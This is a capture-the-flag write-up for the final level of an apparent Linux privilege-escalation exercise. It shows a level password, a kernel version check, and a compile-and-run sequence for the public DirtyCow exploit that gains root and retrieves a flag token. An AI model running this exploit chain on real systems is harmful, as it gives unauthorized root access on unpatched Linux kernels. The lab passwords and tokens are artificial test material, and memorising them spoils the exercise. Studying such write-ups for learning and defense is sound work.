`su level14 -> 2A31L79asukciNyi8uppkEuSx`

For this last level, we have nothing in our home folder.
`find / -user flag14 2>/dev/null` doesn't find any file owned by flag14.

When we `ltrace getflag` we get "You should not reverse this", so we will not try to exploit getflag.

As it is the last level, we think the solution could be an exploit to an higher level that previously, so we will look at exploit on our Linux Kernel.

```bash
$ uname -r
3.2.0-89-generic-pae
```

This kernel is sensible to the dirtycow exploit:
`"A race condition was found in the way the Linux kernel's memory subsystem handled the copy-on-write (COW) breakage of private read-only memory mappings. An unprivileged local user could use this flaw to gain write access to otherwise read-only memory mappings and thus increase their privileges on the system." (RH)`

We find a nice c program to exploit it `https://github.com/FireFart/dirtycow/blob/master/dirty.c`

```bash
$ gcc -pthread dirty.c -o dirty -lcrypt
$ ./dirty
$ su firefart
$ mv /tmp/passwd.bak /etc/passwd
$ id
uid=0(root) gid=0(root) groups=0(root)
$ su flag14
$ getflag
Check flag.Here is your token : 7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ
```

And it's done